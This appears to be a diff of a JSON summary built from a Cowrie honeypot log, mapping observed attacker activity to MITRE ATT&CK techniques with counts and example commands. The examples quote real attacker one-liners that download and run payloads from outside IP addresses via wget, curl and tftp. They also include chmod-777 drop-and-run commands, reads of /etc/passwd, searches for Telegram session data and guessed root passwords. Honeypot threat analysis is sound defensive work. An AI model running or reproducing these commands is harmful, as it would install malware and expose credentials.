@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-25 16:05:09",
+  "generated": "2026-09-25 17:03:13",
   "totals": {
-    "commands": 3012,
-    "login_failed": 4607,
-    "login_success": 243,
-    "sessions": 5320
+    "commands": 3154,
+    "login_failed": 4655,
+    "login_success": 254,
+    "sessions": 5379
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4607,
+      "count": 4655,
       "examples": [
         "root / casa",
         "root / router",
@@ -21,14 +21,14 @@
         "Admin / "
       ],
       "first": "2026-09-25T00:01:09.150965Z",
-      "last": "2026-09-25T16:05:06.061255Z",
-      "unique_ips": 122
+      "last": "2026-09-25T16:54:51.886512Z",
+      "unique_ips": 123
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 1122,
+      "count": 1175,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,8 +37,8 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-25T00:02:44.887220Z",
-      "last": "2026-09-25T15:54:45.596851Z",
-      "unique_ips": 75
+      "last": "2026-09-25T16:54:54.361404Z",
+      "unique_ips": 76
     },
     {
       "id": "T1082",
@@ -60,7 +60,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 243,
+      "count": 254,
       "examples": [
         "root / root",
         "adm / adm",
@@ -69,14 +69,14 @@
         "admin / password"
       ],
       "first": "2026-09-25T00:02:39.589537Z",
-      "last": "2026-09-25T15:54:32.467998Z",
-      "unique_ips": 101
+      "last": "2026-09-25T16:54:53.494042Z",
+      "unique_ips": 102
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 104,
+      "count": 124,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,14 +85,14 @@
         "cd /tmp||cd /var/tmp||cd /; (wget -q -O- http://176.65.139.196/bins/kla.sh | sh || curl -s http://176.65.139.196/bins/kl"
       ],
       "first": "2026-09-25T00:20:41.496654Z",
-      "last": "2026-09-25T15:54:43.597614Z",
-      "unique_ips": 48
+      "last": "2026-09-25T16:54:54.361404Z",
+      "unique_ips": 49
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 78,
+      "count": 79,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "w",
@@ -101,8 +101,8 @@
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-25T00:20:41.496654Z",
-      "last": "2026-09-25T15:46:41.417868Z",
-      "unique_ips": 44
+      "last": "2026-09-25T16:54:53.806633Z",
+      "unique_ips": 45
     },
     {
       "id": "T1057",
@@ -123,7 +123,7 @@
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 39,
+      "count": 40,
       "examples": [
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
         "ls -lh $(which ls)",
@@ -131,7 +131,7 @@
         "ls /"
       ],
       "first": "2026-09-25T00:11:45.662940Z",
-      "last": "2026-09-25T15:46:36.561781Z",
+      "last": "2026-09-25T16:07:38.291840Z",
       "unique_ips": 39
     },
     {
@@ -185,6 +185,18 @@
       "unique_ips": 3
     },
     {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-25T01:44:13.976478Z",
+      "last": "2026-09-25T16:54:53.811521Z",
+      "unique_ips": 3
+    },
+    {
       "id": "T1016",
       "name": "System Network Configuration Discovery",
       "tactic": "Discovery",
@@ -194,18 +206,6 @@
       ],
       "first": "2026-09-25T00:11:41.675158Z",
       "last": "2026-09-25T07:16:32.880877Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-09-25T01:44:13.976478Z",
-      "last": "2026-09-25T10:54:23.262024Z",
       "unique_ips": 2
     },
     {
@@ -236,31 +236,31 @@
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      243
+      255
     ],
     [
       "sh",
-      172
+      181
     ],
     [
       "shell",
-      172
+      181
     ],
     [
       "system",
-      170
+      179
     ],
     [
       "enable",
-      169
+      178
     ],
     [
       "ping; sh",
-      162
+      170
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      81
+      85
     ],
     [
       "/bin/busybox",
@@ -291,28 +291,28 @@
       4
     ],
     [
-      "/bin/busybox bfiNOqXl",
+      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
       3
     ],
     [
-      "/ip cloud print",
-      2
+      "echo SHELL_TEST",
+      3
     ],
     [
-      "locate D877F783D5D3EF8Cs",
-      2
+      "/bin/busybox TEST",
+      3
     ],
     [
-      "echo Hi | cat -n",
-      2
+      "cat /proc",
+      3
     ],
     [
-      "admin",
-      2
+      "./",
+      3
     ],
     [
-      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
-      2
+      "/bin/busybox bfiNOqXl",
+      3
     ]
   ]
 }
